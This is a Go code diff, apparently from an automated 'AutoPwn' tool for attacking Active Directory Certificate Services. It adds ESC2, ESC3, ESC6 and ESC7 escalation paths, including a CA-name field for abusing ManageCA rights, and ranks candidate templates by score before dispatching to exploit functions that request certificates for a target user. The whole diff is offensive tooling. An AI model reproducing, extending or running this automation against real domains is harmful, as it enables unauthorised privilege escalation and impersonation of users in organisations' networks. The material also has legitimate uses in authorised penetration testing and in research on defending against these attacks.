@@ -34,6 +34,7 @@ type escCandidate struct {
 	escType      string
 	score        int
 	templateName string
+	caName       string // ESC7: target CA name
 	// relay-only fields
 	relayCommand string
 	isRelay      bool
@@ -168,9 +169,21 @@ func buildCandidates(cfg *AutoPwnConfig, result *EnumerationResult) []escCandida
 				candidates = append(candidates, escCandidate{
 					escType: "ESC1", score: 10, templateName: tmpl.Name,
 				})
+			case "ESC2":
+				candidates = append(candidates, escCandidate{
+					escType: "ESC2", score: 8, templateName: tmpl.Name,
+				})
+			case "ESC3":
+				candidates = append(candidates, escCandidate{
+					escType: "ESC3", score: 7, templateName: tmpl.Name,
+				})
 			case "ESC4-EXPLOITABLE":
 				candidates = append(candidates, escCandidate{
 					escType: "ESC4", score: 6, templateName: tmpl.Name,
+				})
+			case "ESC6":
+				candidates = append(candidates, escCandidate{
+					escType: "ESC6", score: 9, templateName: tmpl.Name,
 				})
 			case "ESC9":
 				if cfg.AttackerDN != "" {
@@ -182,6 +195,13 @@ func buildCandidates(cfg *AutoPwnConfig, result *EnumerationResult) []escCandida
 				}
 			}
 		}
+	}
+
+	// ESC7: Vulnerable CA ACLs (ManageCA → enable ESC6 → exploit)
+	for _, f := range result.ESC7Findings {
+		candidates = append(candidates, escCandidate{
+			escType: "ESC7", score: 4, caName: f.CAName,
+		})
 	}
 
 	// ESC13: OID group link abuse
@@ -230,8 +250,16 @@ func executeExploit(cfg *AutoPwnConfig, c escCandidate) (*x509.Certificate, *ecd
 	switch c.escType {
 	case "ESC1":
 		return ExploitESC1(cfg.ADCSConfig, c.templateName, cfg.TargetUPN)
+	case "ESC2":
+		return ExploitESC2(cfg.ADCSConfig, c.templateName, cfg.TargetUPN)
+	case "ESC3":
+		return ExploitESC3(cfg.ADCSConfig, c.templateName, cfg.TargetUPN)
 	case "ESC4":
 		return ExploitESC4(cfg.ADCSConfig, c.templateName, cfg.TargetUPN)
+	case "ESC6":
+		return ExploitESC6(cfg.ADCSConfig, c.templateName, cfg.TargetUPN)
+	case "ESC7":
+		return ExploitESC7(cfg.ADCSConfig, c.caName, cfg.TargetUPN)
 	case "ESC9":
 		return ExploitESC9(cfg.ADCSConfig, c.templateName, cfg.AttackerDN, cfg.TargetUPN)
 	case "ESC13":
